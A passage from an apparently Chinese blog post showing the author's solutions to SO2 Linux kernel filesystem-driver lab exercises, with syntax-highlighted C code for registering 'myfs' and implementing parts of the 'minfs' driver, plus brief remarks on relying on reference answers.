myfs_fill_super);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 1: define file_system_type structure */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> <span class="title">my_fs_type</span> =</span> &#123;</span><br><span class="line">	.owner		= THIS_MODULE,</span><br><span class="line">	.name		= <span class="string">&quot;myfs&quot;</span>,</span><br><span class="line">	.mount		= myfs_mount,</span><br><span class="line">	.kill_sb	= kill_litter_super,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">myfs_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: register */</span></span><br><span class="line">	err = register_filesystem(&amp;my_fs_type);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;register_filesystem failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">myfs_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: unregister */</span></span><br><span class="line">	unregister_filesystem(&amp;my_fs_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(myfs_init);</span><br><span class="line">module_exit(myfs_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一次写文件系统驱动，很多东西都不懂，所以很大程度上参考了答案</li>
<li>感觉我自己写的时候就是 API 操作不熟悉，在网上不一定能找到正确的 API，有些 API 有特殊的运用场景，不能随便使用</li>
<li>根据传入参数和返回值可以判断一些 API 是否符合使用场景，但后来懒得一个一个试就直接看答案了</li>
</ul>
<p>2.minfs 完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 Lab - Filesystem drivers</span></span><br><span class="line"><span class="comment"> * Exercise #2 (dev filesystem)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/buffer_head.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pagemap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;minfs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple filesystem&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_LEVEL	KERN_ALERT</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">minfs_sb_info</span> &#123;</span></span><br><span class="line">	__u8 version;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> imap;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">sbh</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> &#123;</span></span><br><span class="line">	__u16 data_block;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> <span class="title">vfs_inode</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* declarations of functions that are part of operation structures */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minfs_readdir</span><span class="params">(struct file *filp, struct dir_context *ctx)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> struct dentry *<span class="title">minfs_lookup</span><span class="params">(struct inode *dir,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct dentry *dentry, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minfs_create</span><span class="params">(struct inode *dir, struct dentry *dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">umode_t</span> mode, <span class="keyword">bool</span> excl)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* dir and inode operation structures */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">minfs_dir_operations</span> =</span> &#123;</span><br><span class="line">	.read		= generic_read_dir,</span><br><span class="line">	.iterate	= minfs_readdir,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> <span class="title">minfs_dir_inode_operations</span> =</span> &#123;</span><br><span class="line">	.lookup		= minfs_lookup,</span><br><span class="line">	<span class="comment">/* TODO 7: Use minfs_create as the create function. */</span></span><br><span class="line">	.create		= minfs_create,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> <span class="title">minfs_aops</span> =</span> &#123;</span><br><span class="line">	.readpage       = simple_readpage,</span><br><span class="line">	.write_begin    = simple_write_begin,</span><br><span class="line">	.write_end      = simple_write_end,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">minfs_file_operations</span> =</span> &#123;</span><br><span class="line">	.read_iter	= generic_file_read_iter,</span><br><span class="line">	.write_iter	= generic_file_write_iter,</span><br><span class="line">	.mmap		= generic_file_mmap,</span><br><span class="line">	.llseek		= generic_file_llseek,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> <span class="title">minfs_file_inode_operations</span> =</span> &#123;</span><br><span class="line">	.getattr	= simple_getattr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode *<span class="title">minfs_iget</span><span class="params">(struct super_block *s, <span class="keyword">unsigned</span> <span class="keyword">long</span> ino)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode</span> *<span class="title">mi</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">bh</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> *<span class="title">mii</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocate VFS inode. */</span></span><br><span class="line">	inode = iget_locked(s, ino);</span><br><span class="line">	<span class="keyword">if</span> (inode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;error aquiring inode\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Return inode from cache */</span></span><br><span class="line">	<span class="keyword">if</span> (!(inode-&gt;i_state &amp; I_NEW))</span><br><span class="line">		<span class="keyword">return</span> inode;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 4: Read block with inodes. It&#x27;s the second block on</span></span><br><span class="line"><span class="comment">	 * the device, i.e. the block with the index 1. This is the index</span></span><br><span class="line"><span class="comment">	 * to be passed to sb_bread().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	bh = sb_bread(s,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(bh==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">goto</span> out_bad_sb;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 4: Get inode with index ino from the block. */</span></span><br><span class="line">	mi = ((struct minfs_inode *)bh-&gt;b_data) + ino;</span><br><span class="line">	<span class="comment">/* TODO 4: fill VFS inode */</span></span><br><span class="line">	inode-&gt;i_mode = mi-&gt;mode;</span><br><span class="line">	inode-&gt;i_size = mi-&gt;size;</span><br><span class="line">	inode-&gt;i_blocks = mi-&gt;data_block;</span><br><span class="line">	i_uid_write(inode, mi-&gt;uid);</span><br><span class="line">	i_gid_write(inode, mi-&gt;gid);</span><br><span class="line">	inode-&gt;i_mtime = current_time(inode);</span><br><span class="line">	inode-&gt;i_atime = current_time(inode);</span><br><span class="line">	inode-&gt;i_ctime = current_time(inode);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 7: Fill address space operations (inode-&gt;i_mapping-&gt;a_ops) */</span></span><br><span class="line">	inode-&gt;i_mapping-&gt;a_ops = &amp;minfs_aops;</span><br><span class="line">	<span class="keyword">if</span> (S_ISDIR(inode-&gt;i_mode)) &#123;</span><br><span class="line">		<span class="comment">/* TODO 4: Fill dir inode operations. */</span></span><br><span class="line">		inode-&gt;i_op = &amp;simple_dir_inode_operations;</span><br><span class="line">		inode-&gt;i_fop = &amp;simple_dir_operations;</span><br><span class="line">		<span class="comment">/* TODO 5: Use minfs_dir_inode_operations for i_op</span></span><br><span class="line"><span class="comment">		 * and minfs_dir_operations for i_fop. */</span></span><br><span class="line">		inode-&gt;i_op = &amp;minfs_dir_inode_operations;</span><br><span class="line">		inode-&gt;i_fop = &amp;minfs_dir_operations;</span><br><span class="line">		<span class="comment">/* TODO 4: Directory inodes start off with i_nlink == 2.</span></span><br><span class="line"><span class="comment">		 * (use inc_link) */</span></span><br><span class="line">		inc_nlink(inode);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 7: Fill inode and file operations for regular files</span></span><br><span class="line"><span class="comment">	 * (i_op and i_fop). Use the S_ISREG macro.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span>(S_ISREG(inode-&gt;i_mode))&#123;</span><br><span class="line">		inode-&gt;i_op = &amp;minfs_file_inode_operations;</span><br><span class="line">		inode-&gt;i_fop = &amp;minfs_file_operations;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fill data for mii */</span></span><br><span class="line">	mii = container_of(inode, struct minfs_inode_info, vfs_inode);</span><br><span class="line">	<span class="comment">/* TODO 4: uncomment after the minfs_inode is initialized */</span></span><br><span class="line">	mii-&gt;data_block = mi-&gt;data_block;</span><br><span class="line">	<span class="comment">/* Free resources. */</span></span><br><span class="line">	<span class="comment">/* TODO 4: uncomment after the buffer_head is initialized */</span></span><br><span class="line">	brelse(bh);</span><br><span class="line">	unlock_new_inode(inode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> inode;</span><br><span class="line"></span><br><span class="line">out_bad_sb:</span><br><span class="line">	iget_failed(inode);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minfs_readdir</span><span class="params">(struct file *filp, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">bh</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_dir_entry</span> *<span class="title">de</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> *<span class="title">mii</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> over;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 5: Get inode of directory and container inode. */</span></span><br><span class="line">	inode = file_inode(filp);</span><br><span class="line">	mii  = container_of(inode, struct minfs_inode_info, vfs_inode);</span><br><span class="line">	<span class="comment">/* TODO 5: Get superblock from inode (i_sb). */</span></span><br><span class="line">	sb = inode-&gt;i_sb;</span><br><span class="line">	<span class="comment">/* TODO 5: Read data block for directory inode. */</span></span><br><span class="line">	bh = sb_bread(sb, mii-&gt;data_block);</span><br><span class="line">	<span class="keyword">if</span> (bh == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> out_bad_sb;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (; ctx-&gt;pos &lt; MINFS_NUM_ENTRIES; ctx-&gt;pos++) &#123;</span><br><span class="line">		<span class="comment">/* TODO 5: Data block contains an array of</span></span><br><span class="line"><span class="comment">		 * &quot;struct minfs_dir_entry&quot;. Use `de&#x27; for storing.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		de = (struct minfs_dir_entry *) bh-&gt;b_data + ctx-&gt;pos;</span><br><span class="line">		<span class="comment">/* TODO 5: Step over empty entries (de-&gt;ino == 0). */</span></span><br><span class="line">		<span class="keyword">if</span> (de-&gt;ino == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Use `over` to store return value of dir_emit and exit</span></span><br><span class="line"><span class="comment">		 * if required.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		over = dir_emit(ctx, de-&gt;name, MINFS_NAME_LEN, de-&gt;ino,</span><br><span class="line">				DT_UNKNOWN);</span><br><span class="line">		<span class="keyword">if</span> (over) &#123;</span><br><span class="line">			printk(KERN_DEBUG <span class="string">&quot;Read %s from folder %s, ctx-&gt;pos: %lld\n&quot;</span>,</span><br><span class="line">				de-&gt;name,</span><br><span class="line">				filp-&gt;f_path.dentry-&gt;d_name.name,</span><br><span class="line">				ctx-&gt;pos);</span><br><span class="line">			ctx-&gt;pos++;</span><br><span class="line">			<span class="keyword">goto</span> done;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">	brelse(bh);</span><br><span class="line">out_bad_sb:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Find dentry in parent folder. Return parent folder&#x27;s data buffer_head.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct minfs_dir_entry *<span class="title">minfs_find_entry</span><span class="params">(struct dentry *dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct buffer_head **bhp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span 